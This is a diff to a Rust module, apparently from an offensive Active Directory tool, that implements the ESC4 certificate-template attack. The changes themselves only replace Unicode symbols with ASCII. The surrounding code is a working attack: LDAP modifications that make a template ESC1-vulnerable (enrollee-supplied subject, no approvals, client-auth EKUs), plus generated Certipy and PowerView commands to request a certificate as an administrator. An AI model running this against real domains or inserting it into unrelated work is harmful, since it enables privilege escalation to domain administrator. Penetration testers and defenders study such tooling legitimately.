@@ -1,4 +1,4 @@
-//! ESC4 — Vulnerable Certificate Template Access Control
+//! ESC4 -- Vulnerable Certificate Template Access Control
 //!
 //! When an attacker has WriteProperty / WriteDacl / WriteOwner rights
 //! on a certificate template object in AD, they can:
@@ -12,16 +12,16 @@
 //! This module implements the full attack chain with proper LDAP writes
 //! using the ldap3 crate's modify operations.
 //!
-//! Reference: SpecterOps "Certified Pre-Owned" — ESC4
+//! Reference: SpecterOps "Certified Pre-Owned" -- ESC4
 
 use crate::error::{OverthroneError, Result};
 use crate::proto::ldap::LdapSession;
 use serde::{Deserialize, Serialize};
 use tracing::{debug, info, warn};
 
-// ═══════════════════════════════════════════════════════════
-// Constants — Template attribute names and values
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+// Constants -- Template attribute names and values
+// ===========================================================
 
 /// Template attributes we need to read/write
 const ATTR_CN: &str = "cn";
@@ -59,9 +59,9 @@ const BACKUP_ATTRS: &[&str] = &[
     ATTR_SECURITY_DESC,
 ];
 
-// ═══════════════════════════════════════════════════════════
-// Template Backup — snapshot before modification
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+// Template Backup -- snapshot before modification
+// ===========================================================
 
 /// Snapshot of original template values for restoration
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -70,7 +70,7 @@ pub struct TemplateBackup {
     pub dn: String,
     /// Template common name
     pub name: String,
-    /// Original attribute values (attribute name → list of values)
+    /// Original attribute values (attribute name -> list of values)
     pub attributes: std::collections::HashMap<String, Vec<String>>,
     /// Timestamp when backup was taken
     pub timestamp: String,
@@ -112,9 +112,9 @@ impl TemplateBackup {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // ESC4 Target
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Target for ESC4 template modification attack
 pub struct Esc4Target {
@@ -151,9 +151,9 @@ impl Esc4Target {
         self.backup.as_ref()
     }
 
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
     // Step 1: Resolve template DN
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
 
     /// Resolve the template's distinguished name from LDAP
     async fn resolve_template_dn(
@@ -188,9 +188,9 @@ impl Esc4Target {
         Ok(dn)
     }
 
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
     // Step 2: Snapshot original values
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
 
     /// Read and save the current template configuration before modifying
     async fn snapshot_template(
@@ -248,11 +248,11 @@ impl Esc4Target {
         Ok(backup)
     }
 
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
     // Step 3: Push ESC1-vulnerable configuration
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
 
-    /// Execute the ESC4 exploit — modify template to be vulnerable to ESC1.
+    /// Execute the ESC4 exploit -- modify template to be vulnerable to ESC1.
     /// Requires the attacker to have WriteProperty over the template object.
     /// This method:
     ///   1. Resolves the template DN
@@ -282,7 +282,7 @@ impl Esc4Target {
             self.template_name
         );
 
-        // ── Modification 1: Allow enrollee to supply subject ──
+        // -- Modification 1: Allow enrollee to supply subject --
         // msPKI-Certificate-Name-Flag = 1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
         let name_flag_val = FLAG_ENROLLEE_SUPPLIES_SUBJECT.to_string();
         ldap.modify_attribute(
@@ -298,7 +298,7 @@ impl Esc4Target {
         })?;
         debug!("Set {} = {}", ATTR_CERT_NAME_FLAG, name_flag_val);
 
-        // ── Modification 2: Remove PEND_ALL_REQUESTS from enrollment flags ──
+        // -- Modification 2: Remove PEND_ALL_REQUESTS from enrollment flags --
         // msPKI-Enrollment-Flag = 0 (no auto-enrollment, no pending)
         ldap.modify_attribute(&dn, ATTR_ENROLLMENT_FLAG, ModifyOp::Replace, &["0"])
             .await
@@ -308,7 +308,7 @@ impl Esc4Target {
             })?;
         debug!("Set {} = 0", ATTR_ENROLLMENT_FLAG);
 
-        // ── Modification 3: Set EKU to Client Authentication ──
+        // -- Modification 3: Set EKU to Client Authentication --
         // pKIExtendedKeyUsage = {Client Auth, Smart Card Logon, PKINIT}
         ldap.modify_attribute(
             &dn,
@@ -323,7 +323,7 @@ impl Esc4Target {
         })?;
         debug!("Set {} = [ClientAuth, SmartCard, PKINIT]", ATTR_EKU);
 
-        // ── Modification 4: Set application policy to match ──
+        // -- Modification 4: Set application policy to match --
         ldap.modify_attribute(
             &dn,
             ATTR_APP_POLICY,
@@ -337,7 +337,7 @@ impl Esc4Target {
         })?;
         debug!("Set {} = [ClientAuth, SmartCard, PKINIT]", ATTR_APP_POLICY);
 
-        // ── Modification 5: Remove issuance requirements ──
+        // -- Modification 5: Remove issuance requirements --
         // msPKI-RA-Signature = 0 (no authorized signatures required)
         ldap.modify_attribute(&dn, ATTR_RA_SIGNATURE, ModifyOp::Replace, &["0"])
             .await
@@ -347,7 +347,7 @@ impl Esc4Target {
             })?;
         debug!("Set {} = 0", ATTR_RA_SIGNATURE);
 
-        // ── Modification 6: Bump minor revision ──
+        // -- Modification 6: Bump minor revision --
         // AD won't propagate template changes without incrementing this
         let revision_str = new_minor.to_string();
         ldap.modify_attribute(
@@ -364,7 +364,7 @@ impl Esc4Target {
         debug!("Bumped {} to {}", ATTR_MINOR_REVISION, new_minor);
 
         info!(
-            "✓ Template '{}' is now vulnerable to ESC1!",
+            "[+] Template '{}' is now vulnerable to ESC1!",
             self.template_name
         );
         info!("  Backup saved to: {}_backup.json", self.template_name);
@@ -376,9 +376,9 @@ impl Esc4Target {
         Ok(())
     }
 
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
     // Step 4: Restore original configuration
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
 
     /// Restore the template to its original configuration from backup.
     /// Can restore from:
@@ -419,7 +419,7 @@ impl Esc4Target {
         for attr_name in &restore_attrs {
             let values = backup.get_attr_values(attr_name);
             if values.is_empty() {
-                // Attribute didn't exist originally — delete it
+                // Attribute didn't exist originally -- delete it
                 debug!("Deleting {} (was not present originally)", attr_name);
                 ldap.modify_attribute(dn, attr_name, ModifyOp::Delete, &[])
                     .await
@@ -453,15 +453,15 @@ impl Esc4Target {
             })?;
 
         info!(
-            "✓ Template '{}' restored to original configuration",
+            "[+] Template '{}' restored to original configuration",
             backup.name
         );
         Ok(())
     }
 
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
     // Operator command generation (fallback)
-    // ─────────────────────────────────────────────────────────
+    // ---------------------------------------------------------
 
     /// Generate exploit commands for manual execution (Certipy / PowerView)
     /// Use this when LDAP write access is not available or as a reference.
@@ -502,18 +502,18 @@ impl Esc4Target {
         );
 
         let instructions = format!(
-            "╔═══════════════════════════════════════════════╗\n\
-             ║          ESC4 — Template Modification          ║\n\
-             ╚═══════════════════════════════════════════════╝\n\n\
+            "+===============================================+\n\
+             |          ESC4 -- Template Modification          |\n\
+             +===============================================+\n\n\
              Target Template: {}\n\
              Domain: {}\n\
              Attacker: {}\n\n\
-             ── Certipy (Recommended) ──────────────────────\n\
+             -- Certipy (Recommended) ----------------------\n\
              # Modify template:\n\
              {}\n\n\
              # Request cert as admin:\n\
              {}\n\n\
-             ── PowerView ──────────────────────────────────\n\
+             -- PowerView ----------------------------------\n\
              {}\n",
             self.template_name,
             self.domain,
@@ -535,9 +535,9 @@ impl Esc4Target {
         );
 
         Ok(format!(
-            "╔═══════════════════════════════════════════════╗\n\
-             ║          ESC4 — Template Restoration           ║\n\
-             ╚═══════════════════════════════════════════════╝\n\n\
+            "+===============================================+\n\
+             |          ESC4 -- Template Restoration           |\n\
+             +===============================================+\n\n\
              [Certipy]\n\
              {}\n\n\
              [Overthrone]\n\
@@ -548,13 +548,13 @@ impl Esc4Target {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // LDAP Modify Operation Enum
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// LDAP modify operation type.
 /// Maps to ldap3::Mod variants. This enum exists so that
-/// esc4.rs doesn't need to import ldap3 directly — the
+/// esc4.rs doesn't need to import ldap3 directly -- the
 /// LdapSession translates these.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum ModifyOp {
@@ -566,9 +566,9 @@ pub enum ModifyOp {
     Delete,
 }
 
-// ═══════════════════════════════════════════════════════════
-// Helper — LDAP filter escaping
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+// Helper -- LDAP filter escaping
+// ===========================================================
 
 /// Escape special characters in LDAP filter values per RFC 4515
 fn ldap3_escape(input: &str) -> String {
@@ -586,9 +586,9 @@ fn ldap3_escape(input: &str) -> String {
     out
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Tests
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 #[cfg(test)]
 mod tests {
